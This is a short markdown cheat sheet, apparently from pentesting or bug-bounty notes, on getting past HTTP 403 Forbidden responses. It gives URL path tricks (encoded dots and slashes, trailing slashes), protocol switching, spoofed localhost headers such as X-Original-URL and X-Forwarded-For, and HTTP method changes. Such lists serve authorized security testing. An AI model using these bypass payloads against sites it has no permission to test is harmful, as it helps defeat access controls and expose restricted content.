# 403 Bypass Techniques

- If there is a directory like `/path` with no slash at the end, we can try the below things -

```bash
example.com/path -> 403
example.com/* -> 200
example.com/./path -> 200
example.com/%2e/path -> 200
```

- If we find a file path like `/file.txt` with no slash at the end, we can try below things -

```bash
example.com/file.txt -> 403
example.com/file.txt/ -> 200
example.com/%2f/file.txt/ -> 200
```

- Try changing protocol, from `https` to `http` and vice versa.

```bash
https://example.com -> 403
http://example.com -> 200
```

- Using headers in HTTP request

```bash
X-Forwarded-For: http://127.0.0.1:80
Content-length: 0
X-Rewrite-URL: http://127.0.0.1:80
X-Original-URL: http://127.0.0.1:80
X-Custom-IP-Authorization: 127.0.0.1:80
```

- By changing HTTP method:
    - GET → POST
    - GET → TRACE
    - GET → PUT
    - GET → OPTIONS